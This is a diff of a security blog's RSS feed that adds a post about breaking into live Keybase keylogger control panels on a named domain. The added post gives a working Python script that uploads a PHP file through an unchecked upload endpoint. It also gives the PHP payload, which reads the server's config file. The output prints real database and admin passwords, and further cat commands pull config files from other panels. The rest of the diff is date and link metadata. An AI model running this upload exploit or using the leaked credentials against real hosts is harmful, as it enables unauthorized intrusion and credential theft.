@@ -5,8 +5,8 @@
     <description>Software is like underwear. Update it regularly.</description>
     <link>http://misterch0c.github.io/</link>
     <atom:link href="http://misterch0c.github.io/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Sun, 17 Jan 2016 12:17:40 +0100</pubDate>
-    <lastBuildDate>Sun, 17 Jan 2016 12:17:40 +0100</lastBuildDate>
+    <pubDate>Sun, 17 Jan 2016 13:30:40 +0100</pubDate>
+    <lastBuildDate>Sun, 17 Jan 2016 13:30:40 +0100</lastBuildDate>
     <generator>Jekyll v3.0.1</generator>
     
       <item>
@@ -19,9 +19,9 @@ Turns out Keybase is not a botner but rather a keylogger, it can also take scree
 &lt;p&gt;One of the domain was still up and there was 3 Keybase panels listed on Cybercrime Tracker:&lt;/p&gt;
 
 &lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;http://www.omarabdulaziz.com/golden/login.php&quot;&gt;www.omarabdulaziz.com/golden/login.php&lt;/a&gt;&lt;br&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;http://www.omarabdulaziz.com/daniel/login.php&quot;&gt;www.omarabdulaziz.com/daniel/login.php&lt;/a&gt;&lt;br&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;http://www.omarabdulaziz.com/ugo/login.php&quot;&gt;www.omarabdulaziz.com/ugo/login.php&lt;/a&gt;&lt;br&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://www.omarabdulaziz.com/golden/login.php&quot;&gt;www.omarabdulaziz.com/golden/login.php&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://www.omarabdulaziz.com/daniel/login.php&quot;&gt;www.omarabdulaziz.com/daniel/login.php&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://www.omarabdulaziz.com/ugo/login.php&quot;&gt;www.omarabdulaziz.com/ugo/login.php&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;p&gt;&lt;img src=&quot;http://i.imgur.com/gxIIlJ1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
@@ -114,9 +114,131 @@ cat /home/omarabdu/public_html/nonso/config.php&lt;/code&gt;&lt;/pre&gt;&lt;/fig
 
 &lt;p&gt;&lt;img src=&quot;http://www.reactiongifs.com/wp-content/uploads/2013/02/lolol.gif&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
 </description>
-        <pubDate>Sat, 16 Jan 2016 18:00:21 +0100</pubDate>
-        <link>http://misterch0c.github.io/jekyll/2016/01/16/1-panel-2-panels/</link>
-        <guid isPermaLink="true">http://misterch0c.github.io/jekyll/2016/01/16/1-panel-2-panels/</guid>
+        <pubDate>Sun, 17 Jan 2016 13:00:21 +0100</pubDate>
+        <link>http://misterch0c.github.io/jekyll/2016/01/17/1-panel-2-panels/</link>
+        <guid isPermaLink="true">http://misterch0c.github.io/jekyll/2016/01/17/1-panel-2-panels/</guid>
+        
+        <category>keybase</category>
+        
+        <category>c&amp;c</category>
+        
+        <category>botnet</category>
+        
+        <category>malware</category>
+        
+        
+        <category>jekyll</category>
+        
+      </item>
+    
+      <item>
+        <title>1 panel, 2 panels, 3 panels...</title>
+        <description>&lt;h1&gt;1 panel, 2 panels, 3 panels...&lt;/h1&gt;
+
+&lt;p&gt;I was hanging out on &lt;a href=&quot;http://cybercrime-tracker.net/&quot;&gt;Cybercrime-Tracker&lt;/a&gt; and noticed some Keybase panels. I never heard of that one before so I decided to take a look.
+Turns out Keybase is not a botner but rather a keylogger, it can also take screenshot of the victim&amp;#39;s desktop.&lt;/p&gt;
+
+&lt;p&gt;One of the domain was still up and there was 3 Keybase panels listed on Cybercrime Tracker:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;http://www.omarabdulaziz.com/golden/login.php&quot;&gt;www.omarabdulaziz.com/golden/login.php&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://www.omarabdulaziz.com/daniel/login.php&quot;&gt;www.omarabdulaziz.com/daniel/login.php&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://www.omarabdulaziz.com/ugo/login.php&quot;&gt;www.omarabdulaziz.com/ugo/login.php&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/gxIIlJ1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;The first fail is that permission are not checked on the &lt;code&gt;/image/Imaged&lt;/code&gt; directory, therefore anyone aware of this can access the screenshots:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/1DYLZ2I.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;The first two panels didn&amp;#39;t have the &lt;code&gt;/images/upload.php&lt;/code&gt; file but luckily for me the &lt;code&gt;ugo&lt;/code&gt; did.
+&lt;a href=&quot;http://researchcenter.paloaltonetworks.com/author/unit-42/&quot;&gt;Unit 32&lt;/a&gt; already found some nice vulnerabilities in the Keybase source code so I tried it.&lt;/p&gt;
+
+&lt;p&gt;I ran this python script with the next file as argument.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Usage: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s [php_file]&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__file__&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;URL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://www.omarabdulaziz.com/ugo/&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Sending request...&quot;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;multiple_files&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;file&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;owned.php&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;rb&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))]&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;URL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;image/upload.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;files&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;multiple_files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Results:&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;URL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;image/Images/owned.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;../../config.php&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;It works!&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;/br&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Reading file&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;/br&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file_get_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Here&amp;#39;s the result:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;Sending request...
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;Response&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+Results:
+
+It works!&lt;span class=&quot;nt&quot;&gt;&amp;lt;/br&amp;gt;&lt;/span&gt;Reading file&lt;span class=&quot;nt&quot;&gt;&amp;lt;/br&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;ob_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;//Edit your database details
+&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$mysql_host&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;localhost&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$mysql_database&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;omarabdu_ugo&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$mysql_user&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;omarabdu_ugo&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$mysql_password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;joinkrama2&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;//These are for accessing your web-panel. You can change these any time.
+&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$panelusername&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;admin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$panelpassword&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ugo12345&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;So of course... I got in&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/YQDieYq.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;That&amp;#39;s pretty cool, but are all the panels of this domain actually listed on cybercrime-tracker? I took a look at the public_html folder and found additional panels:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;http://www.omarabdulaziz.com/chuks/login.php&quot;&gt;http://www.omarabdulaziz.com/chuks/login.php&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://www.omarabdulaziz.com/panel2/login.php&quot;&gt;http://www.omarabdulaziz.com/panel2/login.php&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://www.omarabdulaziz.com/nonso/login.php&quot;&gt;http://www.omarabdulaziz.com/nonso/login.php&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://www.omarabdulaziz.com/owerri/login.php&quot;&gt;http://www.omarabdulaziz.com/owerri/login.php&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;So you got it... Since we got cmd exec we can get the passwords for all the panels at once:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;cat /home/omarabdu/public_html/ugo/config.php &amp;amp;
+cat /home/omarabdu/public_html/daniel/config.php &amp;amp;
+cat /home/omarabdu/public_html/golden/config.php &amp;amp;
+cat /home/omarabdu/public_html/chuks/config.php &amp;amp;
+cat /home/omarabdu/public_html/panel2/config.php &amp;amp;
+cat /home/omarabdu/public_html/owerri/config.php
+cat /home/omarabdu/public_html/nonso/config.php&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://www.reactiongifs.com/wp-content/uploads/2013/02/lolol.gif&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+</description>
+        <pubDate>Sun, 17 Jan 2016 13:00:21 +0100</pubDate>
+        <link>http://misterch0c.github.io/jekyll/2016/01/17/1-panel-2-panels/</link>
+        <guid isPermaLink="true">http://misterch0c.github.io/jekyll/2016/01/17/1-panel-2-panels/</guid>
         
         <category>keybase</category>
         
@@ -136,7 +258,7 @@ cat /home/omarabdu/public_html/nonso/config.php&lt;/code&gt;&lt;/pre&gt;&lt;/fig
         <description>&lt;h1&gt;PRIMER 1 VM Walkthrough&lt;/h1&gt;
 
 &lt;p&gt;The PRIMER 1 VM is kinda unique in its kind. While going through the differents levels you&amp;#39;ll go through a good amount of text, ascii arts, animations and music that really make the experience unique.
-The VM was made by @ and is available on &lt;a href=&quot;https://www.vulnhub.com/entry/primer-1,136/&quot;&gt;Vulnhub&lt;/a&gt; or &lt;a href=&quot;http://wiki.fablab-karlsruhe.de/doku.php?id=projekte:primer&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
+The VM was made by @CouchSofa](&lt;a href=&quot;https://twitter.com/CouchSofa&quot;&gt;https://twitter.com/CouchSofa&lt;/a&gt;) and is available on &lt;a href=&quot;https://www.vulnhub.com/entry/primer-1,136/&quot;&gt;Vulnhub&lt;/a&gt; or &lt;a href=&quot;http://wiki.fablab-karlsruhe.de/doku.php?id=projekte:primer&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;I loaded the VM, ran nmap to discover the new host on my network and here is where everything started:&lt;/p&gt;
 
@@ -418,13 +540,17 @@ From there we got this error message:&lt;/p&gt;
 &lt;p&gt;Well this was just about reading the instructions.&lt;/p&gt;
 </description>
         <pubDate>Thu, 02 Jul 2015 16:22:05 +0200</pubDate>
-        <link>http://misterch0c.github.io/jekyll/update/2015/07/02/infosec-institute-ctf-part-one/</link>
-        <guid isPermaLink="true">http://misterch0c.github.io/jekyll/update/2015/07/02/infosec-institute-ctf-part-one/</guid>
+        <link>http://misterch0c.github.io/jekyll/2015/07/02/infosec-institute-ctf-part-one/</link>
+        <guid isPermaLink="true">http://misterch0c.github.io/jekyll/2015/07/02/infosec-institute-ctf-part-one/</guid>
+        
+        <category>ctf</category>
+        
+        <category>writeup</category>
+        
+        <category>infosec</category>
         
         
         <category>jekyll</category>
-        
-        <category>update</category>
         
       </item>
     
